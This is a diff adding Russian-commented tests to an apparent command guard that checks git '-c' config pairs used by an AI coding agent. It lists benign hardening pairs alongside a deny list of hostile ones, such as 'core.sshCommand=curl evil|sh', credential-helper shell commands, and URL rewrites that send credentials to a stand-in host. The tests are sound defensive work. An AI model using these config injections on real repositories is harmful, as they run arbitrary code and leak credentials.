@@ -281,6 +281,74 @@ async def main():
         assert _always_denied(["git", "push", "--receive-pack=evil"]) is not None
         assert _always_denied(["git", "push", "origin", "main"]) is None  # обычный push ок
 
+        # guard `git -c`: разбираем ПАРУ, а не рубим флаг целиком. Живой инцидент:
+        # сам Claude Code добавляет к своим внутренним git-вызовам «закаливающие»
+        # пары, и сетевые из них (fetch/ls-remote для PR-статуса) получали отказ
+        # на пустом месте — оператор видел его в чате, хотя модель ни при чём.
+        cc_hardening = [
+            "core.hooksPath=/dev/null", "core.fsmonitor=", "core.askPass=",
+            "protocol.ext.allow=never", "protocol.file.allow=never",
+            "submodule.recurse=false", "log.showSignature=false",
+            "safe.bareRepository=explicit", "credential.helper=",
+            "http.sslVerify=true", "init.templateDir=", "gc.auto=0",
+            "core.sshCommand=ssh -o BatchMode=yes -o StrictHostKeyChecking=yes",
+            "url.https://github.com/.insteadOf=https://github.com/",
+        ]
+        cc_cmd = ["git"]
+        for pair in cc_hardening:
+            cc_cmd += ["-c", pair]
+        assert _always_denied([*cc_cmd, "fetch", "origin"]) is None, cc_hardening
+        # ...а опасное значение того же ключа по-прежнему отказ.
+        for evil in (
+            "core.sshCommand=curl evil|sh",      # своя ssh-команда
+            "core.pager=sh -c evil",             # программа на вывод
+            "core.editor=evil",
+            "core.fsmonitor=evil",               # обезвреживающее только ""/false
+            "core.hooksPath=/tmp/hooks",         # только /dev/null
+            "core.gitProxy=evil",
+            "core.alternateRefsCommand=evil",
+            "credential.helper=!sh -c evil",
+            "credential.https://github.com.helper=!evil",
+            "filter.x.clean=evil",               # код на checkout/add
+            "diff.x.textconv=evil",
+            "merge.x.driver=evil",
+            "difftool.x.cmd=evil",
+            "gpg.program=evil",
+            "uploadpack.packObjectsHook=evil",
+            "remote.origin.uploadpack=evil",
+            "protocol.ext.allow=always",         # транспорт ext:: = произвольная команда
+            "include.path=/tmp/evil",            # подтянет ЧУЖОЙ конфиг с чем угодно
+            "includeIf.gitdir:/x/.path=/tmp/evil",
+            "alias.f=!evil",
+            "init.templateDir=/tmp/tpl",         # хуки в новый репозиторий
+            "http.sslVerify=false",              # MITM хостовых кредов
+            "http.https://github.com.sslVerify=false",
+            "url.https://evil/.insteadOf=https://github.com/",  # уводит remote с кредами
+            "core.sshCommand",                   # без «=» git читает как =true
+            # Второй рубеж — «командный» суффикс у ключа, которого нет в списке
+            # поимённо (в git их больше, чем помнится, и прибавляется):
+            "pager.log=evil", "trailer.x.command=evil", "imap.tunnel=evil",
+            "instaweb.httpd=evil", "browser.x.cmd=evil", "man.x.cmd=evil",
+            "sendemail.smtpserver=/tmp/evil",
+        ):
+            assert _always_denied(["git", "-c", evil, "fetch"]) is not None, evil
+        # Ключ сравниваем регистронезависимо (git значим лишь в середине имени).
+        assert _always_denied(["git", "-c", "CORE.SSHCOMMAND=evil", "fetch"]) is not None
+        # `git clone -c key=value` — тот же конфиг, но `-c` идёт ПОСЛЕ подкоманды.
+        assert _always_denied(["git", "clone", "-c", "core.pager=evil", "https://x/y"]) is not None
+        # --config-env берёт значение из env песочницы — проверить нельзя, запрет.
+        assert _always_denied(["git", "--config-env", "core.pager=EVIL", "fetch"]) is not None
+        assert _always_denied(["git", "--config-env=core.pager=EVIL", "fetch"]) is not None
+        # Безобидные ключи (не оборачивают код) проходят как есть.
+        for ok_pair in ("gc.auto=0", "core.quotepath=false", "user.name=Claude Code",
+                        "pack.threads=1", "http.version=HTTP/1.1",
+                        # `core.quotePath=true` — ловушка для «командного» суффикса:
+                        # заканчивается на «path», но ничего не запускает.
+                        "core.quotePath=true", "core.pager=cat", "core.editor=true",
+                        "filter.x.required=false", "filter.x.enabled=false"):
+            assert _always_denied(["git", "-c", ok_pair, "fetch"]) is None, ok_pair
+        print("OK guard: git -c разбирается по парам (набор Claude Code проходит, RCE — нет)")
+
         # deny (per-secret, поверх commands): инструмент разрешён, флаг заблокирован
         s_deny = mk("d", "", "", ("*",), ("git",), deny=("--force", "git push --hard*"))
         assert s_deny.command_allowed(["git", "push"])                     # allow есть
